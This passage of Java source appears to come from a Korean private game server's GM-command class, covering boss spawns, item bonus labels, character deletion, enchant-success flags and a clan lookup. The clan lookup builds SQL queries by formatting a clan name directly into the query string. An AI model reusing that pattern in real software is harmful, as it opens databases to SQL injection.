				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(1/6)]:돌격! 커츠의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(1/6)]:돌격! 커츠의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("데스나이트")) {
				L1SpawnUtil.spawn2(32856, 33263, (short) 4, 45601, 0, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(2/6)]:돌격! 데스나이트의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(2/6)]:돌격! 데스나이트의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("피닉스")) {
				L1SpawnUtil.spawn2(32853, 33265, (short) 4, 45617, 50, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(3/6)]:돌격! 피닉스의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(3/6)]:돌격! 피닉스의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("마령군왕라이아")) {
				L1SpawnUtil.spawn2(32854, 33259, (short) 4, 45863, 0, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(4/6)]:돌격! 마령군왕 라이아의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(4/6)]:돌격! 마령군왕 라이아의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("사신그림리퍼")) {
				L1SpawnUtil.spawn2(32854, 33266, (short) 4, 7310077, 0, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(5/6)]:돌격! 사신 그림리퍼의 부대가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(5/6)]:돌격! 사신 그림리퍼의 부대가 소환 되었습니다 (장소: 사막 아슈르)");
			} else if (BossName.equalsIgnoreCase("공포의안타라스")) {
				L1SpawnUtil.spawn2(32848, 33260, (short) 4, 7310154, 0, 3600 * 1000, 0);
				L1World.getInstance().broadcastServerMessage("\\aH[이벤트 보스(6/6)]:돌격! 마지막 몬스터가 소환 되었습니다. (장소: 사막 아슈르)");
				SC_PacketBox.broadcastGreen("\\fR[이벤트 보스(6/6)]:돌격! 마지막 몬스터가 소환 되었습니다. (장소: 사막 아슈르)");
			}
		} catch (Exception e) {
			SC_SystemMessage.send(gm, ".보스 [보스이름] ex<커츠/데스나이트/피닉스/마령군왕라이아/사신그림리퍼/공포의안타라스");
		}
	}

	/*
	 * private void setMaxLevel(L1PcInstance gm, String param){ try{ String[]
	 * arr = param.split(" "); if(arr[0].equalsIgnoreCase("설정")){ int i =
	 * Integer.parseInt(arr[1]); Config.MAX_LEVEL = i; Config.MAX_LEVEL_EXP =
	 * ExpTable.getExpByLevel(i) + 5; }else if(arr[0].equalsIgnoreCase("확인")){
	 * }else throw new Exception(); gm.sendPackets(String.format(
	 * "현재 설정된 최대 레벨 : %d(exp : %d)", Config.MAX_LEVEL, Config.MAX_LEVEL_EXP)));
	 * }catch(Exception e){ gm.sendPackets(".최대레벨 [확인]")); gm.sendPackets(
	 * ".최대레벨 [설정] [레벨]")); } }
	 */

	public void setPresentationCode(L1PcInstance gm, String param) {
		try {
			L1ItemInstance.presentationCode = Integer.parseInt(param);
			gm.sendPackets(String.format("표기번호가 %d로 설정되었습니다.", L1ItemInstance.presentationCode));
		} catch (Exception e) {
			gm.sendPackets(String.format(".표기셋팅 숫자"));
		}
	}

	public void showObjectList(L1PcInstance gm, String param) {
		StringBuilder sb = new StringBuilder(256);
		for (L1Object obj : gm.getKnownObjects()) {
			if (obj instanceof L1Character) {
				L1Character c = (L1Character) obj;
				sb.append(c.getName()).append(" ").append(obj.getX()).append(" ").append(obj.getY()).append("\n");
			}
		}

		gm.sendPackets(sb.toString());
	}

	public static void setCharacterInstanceStatus(CommandArgs args) {
		try {
			String name = args.nextString();
			int status = args.nextInt();
			L1PcInstance pc = L1World.getInstance().getPlayer(name);
			if (pc == null) {
				args.notify(String.format("캐릭터이름 : %s를 찾을 수 없습니다.", name));
				return;
			}
			EPcStatus e_status = EPcStatus.fromInt(status);
			if (e_status.equals(EPcStatus.NONE)) {
				StringBuilder sb = new StringBuilder(256);
				EPcStatus[] statuses = EPcStatus.values();
				sb.append("상태 값을 정확히 입력해주세요 ->\r\n");
				for (int i = 0; i < statuses.length; ++i) {
					if (i != 0)
						sb.append(", ");
					sb.append("[").append(statuses[i].toInt()).append(".").append(statuses[i]).append("]");
				}
				args.notify(sb.toString());
				return;
			}
			pc.set_instance_status(e_status);
		} catch (Exception e) {
			args.notify(".캐릭터상태 [캐릭터이름] [상태값]");
		} finally {
			args.dispose();
		}
	}

	private void CurseCharacter(CommandArgs args) {
		try {
			String name = args.nextString();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception();

			L1PcInstance pc = L1World.getInstance().getPlayer(name);
			if (pc == null) {
				args.notify(String.format("%s을(를) 찾을 수 없습니다.", name));
				return;
			}

			pc.add_lateral_damage(args.nextInt());
			pc.add_lateral_reduction(args.nextInt());
			pc.add_lateral_magic_rate(args.nextInt());
			pc.update_lateral_status();
			args.notify(String.format("%s의 현재 상태 - 대미지:%d, 리덕:%d,마법대미지:%d", name, pc.get_lateral_damage(),
					pc.get_lateral_reduction(), pc.get_lateral_magic_rate()));
		} catch (Exception e) {
			args.notify(".저주 [캐릭터이름] [대미지] [리덕션] [마법대미지]");
		}
	}

	private void CurseInitializeCharacter(CommandArgs args) {
		try {
			String command_type = args.nextString();
			if (command_type.equalsIgnoreCase("전체")) {
				L1World.getInstance().getAllPlayerStream().filter((L1PcInstance pc) -> {
					return pc != null;
				}).forEach((L1PcInstance pc) -> {
					pc.set_lateral_damage(0);
					pc.set_lateral_reduction(0);
					pc.set_lateral_magic_rate(0);
				});
				Updator.truncate("tb_lateral_status");
				args.notify("전체 데이터를 초기화했습니다.");
			} else if (command_type.equalsIgnoreCase("캐릭")) {
				String name = args.nextString();
				if (name == null || name.equalsIgnoreCase(""))
					throw new Exception();
				L1PcInstance pc = L1World.getInstance().getPlayer(name);
				if (pc == null) {
					args.notify(String.format("%s을(를) 찾을 수 없습니다.", name));
					return;
				}
				pc.delete_lateral_status();
				args.notify(String.format("%s의 데이터를 초기화했습니다.", name));
			} else {
				throw new Exception();
			}
		} catch (Exception e) {
			args.notify(".저주초기화 [전체] | [캐릭(캐릭 메티스)]");
		}
	}

	private void clanMark(L1PcInstance pc, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String onoff = st.nextToken();
			if (onoff.equalsIgnoreCase("켬")) {
				SC_MarkSee.send(pc, 2, true);
				SC_MarkSee.send(pc, 0, true);
				pc.sendPackets("혈마크 표기를 시작 합니다.");
			} else if (onoff.equalsIgnoreCase("끔")) {
				SC_MarkSee.send(pc, 2, false);
				SC_MarkSee.send(pc, 1, false);
				pc.sendPackets("혈마크 표기를 종료 합니다.");
			} else {
				SC_SystemMessage.send(pc, ".혈마크 [켬 / 끔]");
				return;
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".혈마크 [켬 / 끔]");
		}
	}

	private String itemlevel(L1ItemInstance item) {

		String ggg = "";

		switch (item.get_item_level()) {
		case 1:
			ggg = "\\fH일반 [근거리 치명타 +1%]";
			break;
		case 2:
			ggg = "\\fH일반 [원거리 치명타 +1%]";
			break;
		case 3:
			ggg = "\\fH일반 [마법 치명타 +1%]";
			break;
		case 4:
			ggg = "\\fH일반 [근거리 대미지 +1]";
			break;
		case 5:
			ggg = "\\fH일반 [원거리 대미지 +1]";
			break;
		case 6:
			ggg = "\\fH일반 [근거리 명중 +1]";
			break;
		case 7:
			ggg = "\\fH일반 [원거리 명중 +1]";
			break;
		case 8:
			ggg = "\\fH일반 [대미지감소 +1]";
			break;
		case 9:
			ggg = "\\fH일반 [추가 방어력 +1]";
			break;
		case 10:
			ggg = "\\fH일반 [MR +3]]";
			break;
		case 11:
			ggg = "\\fH일반 [최대HP +30]";
			break;
		case 12:
			ggg = "\\fH일반 [최대MP +20]";
			break;
		case 13:
			ggg = "\\fH일반 [PVP추가대미지 +1]";
			break;
		case 14:
			ggg = "\\fH일반 [PVP대미지감소 +1]";
			break;
		case 15:
			ggg = "\\fH일반 [불 속성 저항 +10]";
			break;
		case 16:
			ggg = "\\fH일반 [땅 속성 저항 +10]";
			break;
		case 17:
			ggg = "\\fH일반 [물 속성 저항 +10]";
			break;
		case 18:
			ggg = "\\fH일반 [바람 속성 저항 +10]";
			break;
		case 19:
			ggg = "\\fH일반 [소지무게증가 +100]";
			break;
		case 20:
			ggg = "\\aH고급 [근거리 치명타 +3%]";
			break;
		case 21:
			ggg = "\\aH고급 [원거리 치명타 +3%]";
			break;
		case 22:
			ggg = "\\aH고급 [마법 치명타 +3%]";
			break;
		case 23:
			ggg = "\\aH고급 [근거리 대미지 +3]";
			break;
		case 24:
			ggg = "\\aH고급 [원거리 대미지 +3]";
			break;
		case 25:
			ggg = "\\aH고급 [근거리 명중 +3]";
			break;
		case 26:
			ggg = "\\aH고급 [원거리 명중 +3]";
			break;
		case 27:
			ggg = "\\aH고급 [대미지 감소 +2]";
			break;
		case 28:
			ggg = "\\aH고급 [추가 방어력 +2]";
			break;
		case 29:
			ggg = "\\aH고급 [MR +6]";
			break;
		case 30:
			ggg = "\\aH고급 [최대 HP +60]";
			break;
		case 31:
			ggg = "\\aH고급 [최대 MP +40]";
			break;
		case 32:
			ggg = "\\aH고급 [DG +3]";
			break;
		case 33:
			ggg = "\\aH고급 [HP절대회복 +30(32초)]";
			break;
		case 34:
			ggg = "\\aH고급 [MP절대회복 +10(64초)]";
			break;
		case 35:
			ggg = "\\aH고급 [ER +3]";
			break;
		case 36:
			ggg = "\\aH고급 [PVP추가대미지 +2]";
			break;
		case 37:
			ggg = "\\aH고급 [PVP대미지감소 +2]";
			break;
		case 38:
			ggg = "\\aH고급 [PVP마법대미지감소 +2%]";
			break;
		case 39:
			ggg = "\\aH고급 [내성: 기술 +2]";
			break;
		case 40:
			ggg = "\\aH고급 [내성: 정령 +2]";
			break;
		case 41:
			ggg = "\\aH고급 [내성: 용언 +2]";
			break;
		case 42:
			ggg = "\\aH고급 [내성: 공포 +2]";
			break;
		case 43:
			ggg = "\\aH고급 [불 속성 저항 +20]";
			break;
		case 44:
			ggg = "\\aH고급 [땅 속성 저항 +20]";
			break;
		case 45:
			ggg = "\\aH고급 [물 속성 저항 +20]";
			break;
		case 46:
			ggg = "\\aH고급 [바람 속성 저항 +20]";
			break;
		case 47:
			ggg = "\\aH고급 [STR +1]";
			break;
		case 48:

			ggg = "\\aH고급 [DEX +1]";
			break;
		case 49:
			ggg = "\\aH고급 [CON +1]";
			break;
		case 50:
			ggg = "\\aH고급 [WIS +1]";
			break;
		case 51:
			ggg = "\\aH고급 [INT +1]";
			break;
		case 52:
			ggg = "\\aH고급 [소지 무게 증가 +200]";
			break;
		case 53:
			ggg = "\\aL희귀 [근거리 치명타 +5%]";
			break;
		case 54:
			ggg = "\\aL희귀 [원거리 치명타 +5%]";
			break;
		case 55:
			ggg = "\\aL희귀 [마법 치명타 +5%]";
			break;
		case 56:
			ggg = "\\aL희귀 [근거리 대미지 +3]";
			break;
		case 57:
			ggg = "\\aL희귀 [원거리 대미지 +3]";
			break;
		case 58:
			ggg = "\\aL희귀 [근거리 명중 +3]";
			break;
		case 59:
			ggg = "\\aL희귀 [원거리 명중 +3]";
			break;
		case 60:
			ggg = "\\aL희귀 [SP +3]";
			break;
		case 61:
			ggg = "\\aL희귀 [마법적중 +3]";
			break;
		case 62:
			ggg = "\\aL희귀 [대미지감소 +3]";
			break;
		case 63:
			ggg = "\\aL희귀 [추가 방어력 +3]";
			break;
		case 64:
			ggg = "\\aL희귀 [MR +10]";
			break;
		case 65:
			ggg = "\\aL희귀 [최대 HP +150]";
			break;
		case 66:
			ggg = "\\aL희귀 [최대 MP +100]";
			break;
		case 67:
			ggg = "\\aL희귀 [DG +5]";
			break;
		case 68:
			ggg = "\\aL희귀 [HP절대회복 +50(32초)]";
			break;
		case 69:
			ggg = "\\aL희귀 [MP절대회복 +12(64초)]";
			break;
		case 70:
			ggg = "\\aL희귀 [ER +5]";
			break;
		case 71:
			ggg = "\\aL희귀 [PVP추가대미지 +3]";
			break;
		case 72:
			ggg = "\\aL희귀 [PVP대미지감소 +3]";
			break;
		case 73:
			ggg = "\\aL희귀 [PVP마법대미지감소 +5%]";
			break;
		case 74:
			ggg = "\\aL희귀 [내성: 기술 +5]";
			break;
		case 75:
			ggg = "\\aL희귀 [내성: 정령 +5]";
			break;
		case 76:
			ggg = "\\aL희귀 [내성: 용언 +5]";
			break;
		case 77:
			ggg = "\\aL희귀 [내성: 공포 +5]";
			break;
		case 78:
			ggg = "\\aL희귀 [적중: 기술 +3]";
			break;
		case 79:
			ggg = "\\aL희귀 [적중: 정령 +3]";
			break;
		case 80:
			ggg = "\\aL희귀 [적중: 용언 +3]";
			break;
		case 81:
			ggg = "\\aL희귀 [적중: 공포 +3]";
			break;
		case 82:
			ggg = "\\aL희귀 [불 속성 저항 +30]";
			break;
		case 83:
			ggg = "\\aL희귀 [땅 속성 저항 +30]";
			break;
		case 84:
			ggg = "\\aL희귀 [물 속성 저항 +30]";
			break;
		case 85:
			ggg = "\\aL희귀 [바람 속성 저항 +30]";
			break;
		case 86:
			ggg = "\\aL희귀 [모든 속성 저항 +10]";
			break;
		case 87:
			ggg = "\\aL희귀 [STR +2]";
			break;
		case 88:
			ggg = "\\aL희귀 [DEX +2]";
			break;
		case 89:
			ggg = "\\aL희귀 [CON +2]";
			break;
		case 90:
			ggg = "\\aL희귀 [WIS +2]";
			break;
		case 91:
			ggg = "\\aL희귀 [INT +2]";
			break;
		case 92:
			ggg = "\\aL희귀 [소지무게증가 +300]";
			break;
		case 93:
			ggg = "\\f3영웅 [근거리 대미지 +5]";
			break;
		case 94:
			ggg = "\\f3영웅 [원거리 대미지 +5]";
			break;
		case 95:
			ggg = "\\f3영웅 [근거리 명중 +5]";
			break;

		case 96:
			ggg = "\\f3영웅 [원거리 명중 +5]";
			break;
		case 97:
			ggg = "\\f3영웅 [SP +5]";
			break;
		case 98:
			ggg = "\\f3영웅 [마법적중 +5]";
			break;
		case 99:
			ggg = "\\f3영웅 [대미지감소 +5]";
			break;
		case 100:
			ggg = "\\f3영웅 [추가 AC -5]";
			break;
		case 101:
			ggg = "\\f3영웅 [MR +15]";
			break;
		case 102:
			ggg = "\\f3영웅 [최대 HP +300]";
			break;
		case 103:
			ggg = "\\f3영웅 [최대 MP +200]";
			break;
		case 104:
			ggg = "\\f3영웅 [DG +10]";
			break;
		case 105:
			ggg = "\\f3영웅 [HP절대회복 +30(32초)]";
			break;
		case 106:
			ggg = "\\f3영웅 [MP절대회복 +30(64초)]";
			break;
		case 107:
			ggg = "\\f3영웅 [ER +12]";
			break;
		case 108:
			ggg = "\\f3영웅 [PVP추가대미지 +7]";
			break;
		case 109:
			ggg = "\\f3영웅 [PVP대미지감소 +7]";
			break;
		case 110:
			ggg = "\\f3영웅 [PVP마법대미지감소 +10%]";
			break;
		case 111:
			ggg = "\\f3영웅 [PVP대미지감소무시 +10]";
			break;
		case 112:
			ggg = "\\f3영웅 [내성: 기술 +8]";
			break;
		case 113:
			ggg = "\\f3영웅 [내성: 정령 +8]";
			break;
		case 114:
			ggg = "\\f3영웅 [내성: 용언 +8]";
			break;
		case 115:
			ggg = "\\f3영웅 [내성: 공포 +8]";
			break;
		case 116:
			ggg = "\\f3영웅 [모든 내성: +3]";
			break;
		case 117:
			ggg = "\\f3영웅 [적중: 기술 +8]";
			break;
		case 118:
			ggg = "\\f3영웅 [적중: 정령 +8]";
			break;
		case 119:
			ggg = "\\f3영웅 [적중: 용언 +8]";
			break;
		case 120:
			ggg = "\\f3영웅 [적중: 공포 +8]";
			break;
		case 121:
			ggg = "\\f3영웅 [모든 적중: +3]";
			break;
		case 122:
			ggg = "\\f3영웅 [모든 속성 저항: +30]";
			break;
		case 123:
			ggg = "\\f3영웅 [STR +3]";
			break;
		case 124:
			ggg = "\\f3영웅 [DEX +3]";
			break;
		case 125:
			ggg = "\\f3영웅 [CON +3]";
			break;
		case 126:
			ggg = "\\f3영웅 [WIS +3]";
			break;
		case 127:
			ggg = "\\f3영웅 [INT +3]";
			break;
		case 128:
			ggg = "\\f3영웅 [모든 스탯 +1]";
			break;
		case 129:
			ggg = "\\f3영웅 [MP 흡수]";
			break;
		case 130:
			ggg = "\\f3영웅 [소지무게증가 +500]";
			break;
		case 131:
			ggg = "\\f4전설 [디케이포션 발동]";
			break;
		case 132:
			ggg = "\\f4전설 [PVP대미지감소무시 +40]";
			break;
		case 133:
			ggg = "\\f4전설 [모든 스탯 +3]";
			break;
		case 134:
			ggg = "\\f4전설 [HP 흡수]";
			break;
		case 135:
			ggg = "\\f4전설 [MP 흡수]";
			break;
		case 136:
			ggg = "\\f4전설 [소울오브프레임 발동]";
			break;
		case 137:
			ggg = "\\f4전설 [이뮨투함무시 +30%]";
			break;
		case 138:
			ggg = "\\f4전설 [저지먼트 발동]";
			break;
		case 139:
			ggg = "\\f4전설 [3단가속 효과]";
			break;
		default:
			ggg = "\\aA없음";
			break;
		}
		return ggg;
	}
	// TODO 중개 거래 게시판

	private void standBy77(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			int objid = 0;
			String acname = null;
			if (target != null) {
				SC_Disconnect.send(target);
			}
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement("SELECT objid, account_name FROM characters WHERE char_name=?");
				pstm.setString(1, pcName);
				rs = pstm.executeQuery();
				while (rs.next()) {
					objid = rs.getInt(1);
					acname = rs.getString(2);
				}
				if (objid == 0) {
					SC_SystemMessage.send(gm, "디비에 해당 유저의 이름이 존재하지 않습니다.");

				} else {
					SC_SystemMessage.send(gm, acname + "계정 " + pcName + "님의 케릭터를 삭제 합니다.");
					CharacterTable.getInstance().deleteCharacter(acname, pcName);
					SC_SystemMessage.send(gm, "해당유저를 정상적으로 삭제 하였습니다.");
				}
			} catch (SQLException e) {

			} finally {
				SQLUtil.close(rs);
				SQLUtil.close(pstm);
				SQLUtil.close(con);
			}

		} catch (Exception eee) {
			SC_SystemMessage.send(gm, ".케릭삭제 [케릭명]");
		}
	}

	private void Blessleaf(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target._Blessleaf = true;
				gm.sendPackets("" + target.getName() + " 님의 기운을 잃은 아이템 성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".기운축복 캐릭명 으로 입력해주세요.");
		}
	}

	private void EnchantWeaponSuccess(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target._EnchantWeaponSuccess = true;
				gm.sendPackets("" + target.getName() + " 님의 무기인챈성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".무기인챈성공 캐릭명 으로 입력해주세요.");
		}
	}

	private void EnchantArmorSuccess(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target._EnchantArmorSuccess = true;
				gm.sendPackets("" + target.getName() + " 님의 방어인챈성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".방어인챈성공 캐릭명 으로 입력해주세요.");
		}
	}

	private static void 보안버프(L1PcInstance gm) {
		gm.addAc(-1);
		SC_PacketBox.send(gm, gm, SC_PacketBox.ICON_SECURITY_SERVICES);
		SC_OwnCharStatus.send(gm);
	}
	private void searchclaner(L1PcInstance gm, String name) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(name);
			String charinfo = null;
			charinfo = String.format(
					"select account_name, char_name, level, clanname, OnlineStatus from characters where clanname Like '%s'",
					target.getClanname());

			if (target.getClan() == null) {
				gm.sendPackets("검색하신 캐릭터는 혈맹에 가입하지 않은 상태입니다.");
				return;
			}

			Selector.exec(charinfo, new FullSelectorHandler() {
				@Override
				public void result(ResultSet rs) throws Exception {
					int i = 0;
					gm.sendPackets(String.format("================== 혈맹 정보 ==================", i));
					while (rs.next()) {
						++i;
						if (rs.getInt(5) > 0) {
							gm.sendPackets(String.format("\\fY계정:%s 캐릭명:%s 레벨:%s 혈맹:%s", rs.getString(1),
									rs.getString(2), rs.getString(3), rs.getString(4), rs.getInt(5)));
						}
					}
				}
			});

			String claninfo = null;
			claninfo = String.format("select total_m, current_m from clan_data where clan_name Like '%s'",
					target.getClanname());

			Selector.exec(claninfo, new FullSelectorHandler() {
				@Override
				public void result(ResultSet rs) throws Exception {
					while (rs.next()) {
						gm.sendPackets(
								String.format("\\fU총 혈맹원 : [%s] 접속중인 혈맹원 : %s", rs.getString(1), rs.getString(2)));
					}
				}
			});
		} catch (Exception e) {
			gm.sendPackets("검색 하신 캐릭명이 틀리거나 존재 하지 않습니다.");
		}
	}

	
	
}
